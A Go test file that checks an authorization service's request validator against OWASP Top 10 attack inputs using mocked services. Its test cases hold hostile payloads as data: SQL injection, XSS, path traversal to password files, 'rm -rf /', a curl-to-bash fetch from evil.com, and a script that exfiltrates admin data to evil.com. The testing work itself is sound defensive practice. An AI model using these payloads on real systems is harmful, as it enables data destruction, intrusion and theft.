package security

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/you/authzsvc/domain"
	"github.com/you/authzsvc/internal/mocks"
	"github.com/you/authzsvc/internal/services"
)

// TestOWASPTop10AttackVectors tests validation against OWASP Top 10 attack vectors
func TestOWASPTop10AttackVectors(t *testing.T) {
	tests := []struct {
		name           string
		attackVector   string
		owaspCategory  string
		input          map[string]interface{}
		setupMocks     func(*mocks.MockSecurityValidationService, *mocks.MockBusinessValidationService, *mocks.MockRateLimitValidationService)
		expectedThreat domain.ThreatLevel
		expectedTypes  []domain.ThreatType
		validateResult func(t *testing.T, result *domain.ValidationResult)
	}{
		{
			name:          "A01:2021 - Broken Access Control - Privilege Escalation",
			attackVector:  "privilege_escalation",
			owaspCategory: "A01:2021",
			input: map[string]interface{}{
				"user_id": "123",
				"role":    "admin", // Attempting to escalate to admin role
				"action":  "delete_all_users",
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
				
				businessSvc.ValidateBusinessRulesFunc = func(ctx context.Context, entity interface{}, rules []domain.BusinessConstraint) (*domain.ValidationResult, error) {
					return &domain.ValidationResult{
						IsValid: false,
						Passed:  false,
						Errors: []domain.ValidationError{
							{
								Code:      "PRIVILEGE_ESCALATION",
								Message:   "Unauthorized role elevation attempt",
								Severity:  domain.SeverityCritical,
								Category:  domain.CategorySecurity,
								Timestamp: time.Now(),
							},
						},
					}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatCritical,
						ThreatTypes: []domain.ThreatType{domain.ThreatMalware}, // Using malware as closest category for privilege escalation
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatMalware,
								Severity:    domain.SeverityCritical,
								Description: "Privilege escalation attempt detected",
								FieldName:   "role",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.98,
								Confidence:  0.95,
							},
						},
					}, nil
				}
			},
			expectedThreat: domain.ThreatCritical,
			expectedTypes:  []domain.ThreatType{domain.ThreatMalware},
			validateResult: func(t *testing.T, result *domain.ValidationResult) {
				t.Helper()
				if result.IsValid {
					t.Error("expected validation to fail for privilege escalation")
				}
				if result.SecurityResult.ThreatLevel != domain.ThreatCritical {
					t.Errorf("expected critical threat level, got %s", result.SecurityResult.ThreatLevel)
				}
			},
		},
		{
			name:          "A02:2021 - Cryptographic Failures - Sensitive Data Exposure",
			attackVector:  "data_exposure",
			owaspCategory: "A02:2021",
			input: map[string]interface{}{
				"query": "SELECT * FROM users WHERE password = 'plaintext123'",
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatHigh,
						ThreatTypes: []domain.ThreatType{domain.ThreatSQLInjection},
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatSQLInjection,
								Severity:    domain.SeverityError,
								Description: "Potential sensitive data exposure in query",
								FieldName:   "query",
								Pattern:     "password",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.85,
								Confidence:  0.90,
							},
						},
					}, nil
				}
			},
			expectedThreat: domain.ThreatHigh,
			expectedTypes:  []domain.ThreatType{domain.ThreatSQLInjection},
			validateResult: func(t *testing.T, result *domain.ValidationResult) {
				t.Helper()
				if result.IsValid {
					t.Error("expected validation to fail for data exposure")
				}
			},
		},
		{
			name:          "A03:2021 - Injection - SQL Injection",
			attackVector:  "sql_injection",
			owaspCategory: "A03:2021",
			input: map[string]interface{}{
				"username": "admin'; DROP TABLE users; --",
				"search":   "test' UNION SELECT * FROM credit_cards --",
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatCritical,
						ThreatTypes: []domain.ThreatType{domain.ThreatSQLInjection},
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatSQLInjection,
								Severity:    domain.SeverityCritical,
								Description: "SQL injection attempt detected",
								FieldName:   "username",
								Pattern:     "DROP TABLE",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.99,
								Confidence:  0.98,
							},
							{
								Type:        domain.ThreatSQLInjection,
								Severity:    domain.SeverityCritical,
								Description: "SQL injection UNION attack detected",
								FieldName:   "search",
								Pattern:     "UNION SELECT",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.97,
								Confidence:  0.96,
							},
						},
					}, nil
				}
			},
			expectedThreat: domain.ThreatCritical,
			expectedTypes:  []domain.ThreatType{domain.ThreatSQLInjection},
			validateResult: func(t *testing.T, result *domain.ValidationResult) {
				t.Helper()
				if result.IsValid {
					t.Error("expected validation to fail for SQL injection")
				}
				if len(result.SecurityResult.Violations) < 2 {
					t.Errorf("expected at least 2 violations, got %d", len(result.SecurityResult.Violations))
				}
			},
		},
		{
			name:          "A03:2021 - Injection - XSS (Cross-Site Scripting)",
			attackVector:  "xss_injection",
			owaspCategory: "A03:2021",
			input: map[string]interface{}{
				"comment": "<script>alert('XSS')</script>",
				"bio":     "<img src=x onerror=alert('XSS')>",
				"name":    "javascript:alert('XSS')",
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatHigh,
						ThreatTypes: []domain.ThreatType{domain.ThreatXSS},
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatXSS,
								Severity:    domain.SeverityError,
								Description: "XSS script injection detected",
								FieldName:   "comment",
								Pattern:     "<script>",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.92,
								Confidence:  0.95,
							},
							{
								Type:        domain.ThreatXSS,
								Severity:    domain.SeverityError,
								Description: "XSS event handler injection detected",
								FieldName:   "bio",
								Pattern:     "onerror=",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.88,
								Confidence:  0.93,
							},
							{
								Type:        domain.ThreatXSS,
								Severity:    domain.SeverityError,
								Description: "JavaScript protocol injection detected",
								FieldName:   "name",
								Pattern:     "javascript:",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.85,
								Confidence:  0.91,
							},
						},
					}, nil
				}
			},
			expectedThreat: domain.ThreatHigh,
			expectedTypes:  []domain.ThreatType{domain.ThreatXSS},
			validateResult: func(t *testing.T, result *domain.ValidationResult) {
				t.Helper()
				if result.IsValid {
					t.Error("expected validation to fail for XSS injection")
				}
				if len(result.SecurityResult.Violations) != 3 {
					t.Errorf("expected 3 XSS violations, got %d", len(result.SecurityResult.Violations))
				}
			},
		},
		{
			name:          "A04:2021 - Insecure Design - Business Logic Bypass",
			attackVector:  "logic_bypass",
			owaspCategory: "A04:2021",
			input: map[string]interface{}{
				"amount":      -100, // Negative amount to exploit business logic
				"transaction": "refund",
				"user_id":     "999999", // Non-existent user
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
				
				businessSvc.ValidateBusinessRulesFunc = func(ctx context.Context, entity interface{}, rules []domain.BusinessConstraint) (*domain.ValidationResult, error) {
					return &domain.ValidationResult{
						IsValid: false,
						Passed:  false,
						Errors: []domain.ValidationError{
							{
								Code:      "INVALID_AMOUNT",
								Field:     "amount",
								Message:   "Negative amounts not allowed",
								Severity:  domain.SeverityError,
								Category:  domain.CategoryBusiness,
								Timestamp: time.Now(),
							},
							{
								Code:      "INVALID_USER",
								Field:     "user_id",
								Message:   "User does not exist",
								Severity:  domain.SeverityError,
								Category:  domain.CategoryBusiness,
								Timestamp: time.Now(),
							},
						},
					}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatMedium,
						ThreatTypes: []domain.ThreatType{domain.ThreatMalware},
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatMalware,
								Severity:    domain.SeverityWarning,
								Description: "Potential business logic exploitation attempt",
								FieldName:   "amount",
								Action:      domain.ActionLog,
								Blocked:     false,
								RiskScore:   0.65,
								Confidence:  0.75,
							},
						},
					}, nil
				}
			},
			expectedThreat: domain.ThreatMedium,
			expectedTypes:  []domain.ThreatType{domain.ThreatMalware},
			validateResult: func(t *testing.T, result *domain.ValidationResult) {
				t.Helper()
				if result.IsValid {
					t.Error("expected validation to fail for business logic bypass")
				}
				if len(result.Errors) < 2 {
					t.Errorf("expected at least 2 business logic errors, got %d", len(result.Errors))
				}
			},
		},
		{
			name:          "A05:2021 - Security Misconfiguration - Path Traversal",
			attackVector:  "path_traversal",
			owaspCategory: "A05:2021",
			input: map[string]interface{}{
				"filename": "../../../etc/passwd",
				"path":     "..\\..\\windows\\system32\\config\\sam",
				"file":     "....//....//....//etc//shadow",
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatHigh,
						ThreatTypes: []domain.ThreatType{domain.ThreatPathTraversal},
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatPathTraversal,
								Severity:    domain.SeverityError,
								Description: "Path traversal attempt detected",
								FieldName:   "filename",
								Pattern:     "../",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.90,
								Confidence:  0.95,
							},
							{
								Type:        domain.ThreatPathTraversal,
								Severity:    domain.SeverityError,
								Description: "Windows path traversal detected",
								FieldName:   "path",
								Pattern:     "..\\",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.88,
								Confidence:  0.92,
							},
							{
								Type:        domain.ThreatPathTraversal,
								Severity:    domain.SeverityError,
								Description: "Encoded path traversal detected",
								FieldName:   "file",
								Pattern:     "....//",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.85,
								Confidence:  0.89,
							},
						},
					}, nil
				}
			},
			expectedThreat: domain.ThreatHigh,
			expectedTypes:  []domain.ThreatType{domain.ThreatPathTraversal},
			validateResult: func(t *testing.T, result *domain.ValidationResult) {
				t.Helper()
				if result.IsValid {
					t.Error("expected validation to fail for path traversal")
				}
				if len(result.SecurityResult.Violations) != 3 {
					t.Errorf("expected 3 path traversal violations, got %d", len(result.SecurityResult.Violations))
				}
			},
		},
		{
			name:          "A06:2021 - Vulnerable Components - Script Injection",
			attackVector:  "script_injection",
			owaspCategory: "A06:2021",
			input: map[string]interface{}{
				"command": "rm -rf /",
				"script":  "$(curl evil.com/malware.sh | bash)",
				"exec":    "; cat /etc/passwd > /tmp/pwned",
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatCritical,
						ThreatTypes: []domain.ThreatType{domain.ThreatScriptInjection},
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatScriptInjection,
								Severity:    domain.SeverityCritical,
								Description: "Destructive command injection detected",
								FieldName:   "command",
								Pattern:     "rm -rf",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.99,
								Confidence:  0.98,
							},
							{
								Type:        domain.ThreatScriptInjection,
								Severity:    domain.SeverityCritical,
								Description: "Remote script execution attempt",
								FieldName:   "script",
								Pattern:     "curl",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.95,
								Confidence:  0.94,
							},
							{
								Type:        domain.ThreatScriptInjection,
								Severity:    domain.SeverityCritical,
								Description: "Command chaining injection detected",
								FieldName:   "exec",
								Pattern:     "; cat",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.92,
								Confidence:  0.91,
							},
						},
					}, nil
				}
			},
			expectedThreat: domain.ThreatCritical,
			expectedTypes:  []domain.ThreatType{domain.ThreatScriptInjection},
			validateResult: func(t *testing.T, result *domain.ValidationResult) {
				t.Helper()
				if result.IsValid {
					t.Error("expected validation to fail for script injection")
				}
				if len(result.SecurityResult.Violations) != 3 {
					t.Errorf("expected 3 script injection violations, got %d", len(result.SecurityResult.Violations))
				}
				// Verify all violations are critical
				for _, violation := range result.SecurityResult.Violations {
					if violation.Severity != domain.SeverityCritical {
						t.Errorf("expected critical severity, got %s", violation.Severity)
					}
				}
			},
		},
		{
			name:          "A10:2021 - Server-Side Request Forgery (SSRF)",
			attackVector:  "ssrf",
			owaspCategory: "A10:2021",
			input: map[string]interface{}{
				"url":      "http://localhost:8080/admin",
				"webhook":  "http://169.254.169.254/latest/meta-data/",
				"callback": "file:///etc/passwd",
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatHigh,
						ThreatTypes: []domain.ThreatType{domain.ThreatMalware}, // Using malware as closest for SSRF
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatMalware,
								Severity:    domain.SeverityError,
								Description: "Potential SSRF to localhost detected",
								FieldName:   "url",
								Pattern:     "localhost",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.85,
								Confidence:  0.88,
							},
							{
								Type:        domain.ThreatMalware,
								Severity:    domain.SeverityError,
								Description: "AWS metadata service SSRF attempt",
								FieldName:   "webhook",
								Pattern:     "169.254.169.254",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.95,
								Confidence:  0.97,
							},
							{
								Type:        domain.ThreatMalware,
								Severity:    domain.SeverityError,
								Description: "File protocol SSRF detected",
								FieldName:   "callback",
								Pattern:     "file://",
								Action:      domain.ActionBlock,
								Blocked:     true,
								RiskScore:   0.90,
								Confidence:  0.93,
							},
						},
					}, nil
				}
			},
			expectedThreat: domain.ThreatHigh,
			expectedTypes:  []domain.ThreatType{domain.ThreatMalware},
			validateResult: func(t *testing.T, result *domain.ValidationResult) {
				t.Helper()
				if result.IsValid {
					t.Error("expected validation to fail for SSRF")
				}
				if len(result.SecurityResult.Violations) != 3 {
					t.Errorf("expected 3 SSRF violations, got %d", len(result.SecurityResult.Violations))
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create mocks
			securitySvc := mocks.NewMockSecurityValidationService()
			businessSvc := mocks.NewMockBusinessValidationService()
			rateLimitSvc := mocks.NewMockRateLimitValidationService()

			// Setup test-specific mock behavior
			tt.setupMocks(securitySvc, businessSvc, rateLimitSvc)

			// Create validation service
			config := services.RequestValidationConfig{
				EnableCaching:     false,
				MaxValidationTime: 30 * time.Second,
				EnableMetrics:     false,
			}

			service := services.NewRequestValidationService(
				securitySvc,
				businessSvc,
				rateLimitSvc,
				nil, // No Redis for security tests
				config,
			)

			// Create validation context
			validationCtx := &domain.ValidationContext{
				RequestID: "security_test_" + tt.attackVector,
				Endpoint:  "/api/test",
				Method:    "POST",
				IPAddress: "192.168.1.100",
				UserAgent: "SecurityTestAgent/1.0",
				Timestamp: time.Now(),
			}

			// Execute validation
			ctx := context.Background()
			result, err := service.ValidateRequest(ctx, tt.input, validationCtx)

			if err != nil {
				t.Fatalf("validation service error: %v", err)
			}

			// Validate threat level
			if result.SecurityResult != nil && result.SecurityResult.ThreatLevel != tt.expectedThreat {
				t.Errorf("expected threat level %s, got %s", tt.expectedThreat, result.SecurityResult.ThreatLevel)
			}

			// Validate threat types
			if result.SecurityResult != nil {
				for _, expectedType := range tt.expectedTypes {
					found := false
					for _, actualType := range result.SecurityResult.ThreatTypes {
						if actualType == expectedType {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("expected threat type %s not found in result", expectedType)
					}
				}
			}

			// Run custom validation
			tt.validateResult(t, result)

			// Log security metrics for monitoring
			t.Logf("OWASP Test: %s | Threat Level: %s | Violations: %d | Attack Vector: %s", 
				tt.owaspCategory, 
				func() string {
					if result.SecurityResult != nil {
						return string(result.SecurityResult.ThreatLevel)
					}
					return "none"
				}(),
				func() int {
					if result.SecurityResult != nil {
						return len(result.SecurityResult.Violations)
					}
					return 0
				}(),
				tt.attackVector,
			)
		})
	}
}

// TestAdvancedSecurityScenarios tests complex, multi-stage attack scenarios
func TestAdvancedSecurityScenarios(t *testing.T) {
	tests := []struct {
		name           string
		scenario       string
		description    string
		stages         []map[string]interface{}
		setupMocks     func(*mocks.MockSecurityValidationService, *mocks.MockBusinessValidationService, *mocks.MockRateLimitValidationService)
		validateResult func(t *testing.T, results []*domain.ValidationResult)
	}{
		{
			name:        "Multi-stage SQL injection with XSS",
			scenario:    "combined_injection",
			description: "Attacker attempts SQL injection first, then XSS when SQL fails",
			stages: []map[string]interface{}{
				// Stage 1: SQL Injection attempt
				{
					"search": "'; DROP TABLE users; --",
					"filter": "admin",
				},
				// Stage 2: XSS attempt when SQL fails
				{
					"search": "<script>fetch('/admin/users').then(r=>r.text()).then(d=>fetch('http://evil.com',{method:'POST',body:d}))</script>",
					"filter": "normal",
				},
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				callCount := 0
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					callCount++
					if callCount == 1 {
						// First call detects SQL injection
						return &domain.SecurityValidationResult{
							ThreatLevel: domain.ThreatCritical,
							ThreatTypes: []domain.ThreatType{domain.ThreatSQLInjection},
							Violations: []domain.SecurityViolation{
								{
									Type:        domain.ThreatSQLInjection,
									Severity:    domain.SeverityCritical,
									Description: "SQL injection attempt detected",
									FieldName:   "search",
									Pattern:     "DROP TABLE",
									Action:      domain.ActionBlock,
									Blocked:     true,
								},
							},
						}, nil
					} else {
						// Second call detects XSS
						return &domain.SecurityValidationResult{
							ThreatLevel: domain.ThreatHigh,
							ThreatTypes: []domain.ThreatType{domain.ThreatXSS},
							Violations: []domain.SecurityViolation{
								{
									Type:        domain.ThreatXSS,
									Severity:    domain.SeverityError,
									Description: "XSS with data exfiltration detected",
									FieldName:   "search",
									Pattern:     "<script>",
									Action:      domain.ActionBlock,
									Blocked:     true,
								},
							},
						}, nil
					}
				}
				
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					return &domain.RateLimitResult{Allowed: true}, nil
				}
			},
			validateResult: func(t *testing.T, results []*domain.ValidationResult) {
				t.Helper()
				if len(results) != 2 {
					t.Fatalf("expected 2 validation results, got %d", len(results))
				}
				
				// Validate first stage (SQL injection)
				if results[0].SecurityResult.ThreatLevel != domain.ThreatCritical {
					t.Error("expected critical threat for SQL injection stage")
				}
				
				// Validate second stage (XSS)
				if results[1].SecurityResult.ThreatLevel != domain.ThreatHigh {
					t.Error("expected high threat for XSS stage")
				}
				
				// Both should be blocked
				for i, result := range results {
					if result.IsValid {
						t.Errorf("expected stage %d to be blocked", i+1)
					}
				}
			},
		},
		{
			name:        "Privilege escalation with rate limit evasion",
			scenario:    "privilege_escalation_evasion",
			description: "Attacker attempts privilege escalation while evading rate limits",
			stages: []map[string]interface{}{
				// Multiple attempts with slight variations to evade rate limiting
				{"role": "admin", "user_id": "123"},
				{"role": "administrator", "user_id": "123"},
				{"role": "root", "user_id": "123"},
				{"role": "superuser", "user_id": "123"},
			},
			setupMocks: func(securitySvc *mocks.MockSecurityValidationService, businessSvc *mocks.MockBusinessValidationService, rateLimitSvc *mocks.MockRateLimitValidationService) {
				attemptCount := 0
				rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
					attemptCount++
					// Allow first few attempts, then trigger rate limit
					if attemptCount <= 2 {
						return &domain.RateLimitResult{
							Allowed:      true,
							CurrentCount: attemptCount,
							Limit:        3,
							Remaining:    3 - attemptCount,
						}, nil
					}
					return &domain.RateLimitResult{
						Allowed:      false,
						CurrentCount: attemptCount,
						Limit:        3,
						Remaining:    0,
					}, nil
				}
				
				businessSvc.ValidateBusinessRulesFunc = func(ctx context.Context, entity interface{}, rules []domain.BusinessConstraint) (*domain.ValidationResult, error) {
					return &domain.ValidationResult{
						IsValid: false,
						Passed:  false,
						Errors: []domain.ValidationError{
							{
								Code:      "PRIVILEGE_ESCALATION",
								Message:   "Unauthorized role elevation attempt",
								Severity:  domain.SeverityCritical,
								Category:  domain.CategoryBusiness,
								Timestamp: time.Now(),
							},
						},
					}, nil
				}
				
				securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
					return &domain.SecurityValidationResult{
						ThreatLevel: domain.ThreatHigh,
						ThreatTypes: []domain.ThreatType{domain.ThreatMalware},
						Violations: []domain.SecurityViolation{
							{
								Type:        domain.ThreatMalware,
								Severity:    domain.SeverityError,
								Description: "Privilege escalation attempt",
								Action:      domain.ActionBlock,
								Blocked:     true,
							},
						},
					}, nil
				}
			},
			validateResult: func(t *testing.T, results []*domain.ValidationResult) {
				t.Helper()
				if len(results) != 4 {
					t.Fatalf("expected 4 validation results, got %d", len(results))
				}
				
				// First two should be blocked due to business rules
				for i := 0; i < 2; i++ {
					if results[i].IsValid {
						t.Errorf("expected stage %d to be blocked by business rules", i+1)
					}
					if len(results[i].Errors) == 0 {
						t.Errorf("expected business rule errors in stage %d", i+1)
					}
				}
				
				// Later attempts should be blocked by rate limiting
				for i := 2; i < len(results); i++ {
					if results[i].IsValid {
						t.Errorf("expected stage %d to be blocked by rate limit", i+1)
					}
					// Check for rate limit errors
					found := false
					for _, err := range results[i].Errors {
						if strings.Contains(err.Code, "RATE_LIMIT") {
							found = true
							break
						}
					}
					if !found {
						t.Errorf("expected rate limit error in stage %d", i+1)
					}
				}
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create mocks
			securitySvc := mocks.NewMockSecurityValidationService()
			businessSvc := mocks.NewMockBusinessValidationService()
			rateLimitSvc := mocks.NewMockRateLimitValidationService()

			// Setup test-specific mock behavior
			tt.setupMocks(securitySvc, businessSvc, rateLimitSvc)

			// Create validation service
			config := services.RequestValidationConfig{
				EnableCaching:     false,
				MaxValidationTime: 30 * time.Second,
				EnableMetrics:     false,
			}

			service := services.NewRequestValidationService(
				securitySvc,
				businessSvc,
				rateLimitSvc,
				nil,
				config,
			)

			// Execute all stages
			var results []*domain.ValidationResult
			for i, stage := range tt.stages {
				validationCtx := &domain.ValidationContext{
					RequestID: fmt.Sprintf("security_scenario_%s_stage_%d", tt.scenario, i+1),
					Endpoint:  "/api/test",
					Method:    "POST",
					IPAddress: "192.168.1.100",
					UserAgent: "SecurityTestAgent/1.0",
					Timestamp: time.Now(),
				}

				ctx := context.Background()
				result, err := service.ValidateRequest(ctx, stage, validationCtx)

				if err != nil {
					t.Fatalf("validation service error at stage %d: %v", i+1, err)
				}

				results = append(results, result)
			}

			// Validate overall results
			tt.validateResult(t, results)

			// Log scenario summary
			t.Logf("Security Scenario: %s | Stages: %d | Description: %s", 
				tt.scenario, len(tt.stages), tt.description)
		})
	}
}

// TestSecurityValidationPerformance tests validation performance under security attack loads
func TestSecurityValidationPerformance(t *testing.T) {
	// Skip if running short tests
	if testing.Short() {
		t.Skip("skipping performance test in short mode")
	}

	// Create validation service
	securitySvc := mocks.NewMockSecurityValidationService()
	businessSvc := mocks.NewMockBusinessValidationService()
	rateLimitSvc := mocks.NewMockRateLimitValidationService()

	// Setup mocks to simulate realistic validation times
	securitySvc.ScanForThreatsFunc = func(ctx context.Context, input map[string]interface{}, rules []domain.SecurityConstraint) (*domain.SecurityValidationResult, error) {
		// Simulate security scanning time
		time.Sleep(1 * time.Millisecond)
		return &domain.SecurityValidationResult{
			ThreatLevel: domain.ThreatNone,
		}, nil
	}

	rateLimitSvc.CheckRateLimitFunc = func(ctx context.Context, key string, limit int, window time.Duration) (*domain.RateLimitResult, error) {
		return &domain.RateLimitResult{Allowed: true}, nil
	}

	config := services.RequestValidationConfig{
		EnableCaching:     false,
		MaxValidationTime: 5 * time.Second,
		EnableMetrics:     false,
	}

	service := services.NewRequestValidationService(
		securitySvc,
		businessSvc,
		rateLimitSvc,
		nil,
		config,
	)

	// Test with different payload sizes
	payloadSizes := []int{100, 1000, 10000, 100000}
	
	for _, size := range payloadSizes {
		t.Run(fmt.Sprintf("payload_size_%d", size), func(t *testing.T) {
			// Create large payload to test performance
			payload := map[string]interface{}{
				"data": strings.Repeat("x", size),
			}

			validationCtx := &domain.ValidationContext{
				RequestID: fmt.Sprintf("perf_test_%d", size),
				Endpoint:  "/api/test",
				Method:    "POST",
				IPAddress: "192.168.1.100",
				Timestamp: time.Now(),
			}

			start := time.Now()
			result, err := service.ValidateRequest(context.Background(), payload, validationCtx)
			duration := time.Since(start)

			if err != nil {
				t.Fatalf("validation failed: %v", err)
			}

			if !result.IsValid {
				t.Error("expected validation to pass for performance test")
			}

			// Performance assertions
			maxDuration := 100 * time.Millisecond
			if duration > maxDuration {
				t.Errorf("validation took too long: %v (max: %v)", duration, maxDuration)
			}

			t.Logf("Payload size: %d bytes | Duration: %v | Valid: %t", 
				size, duration, result.IsValid)
		})
	}
}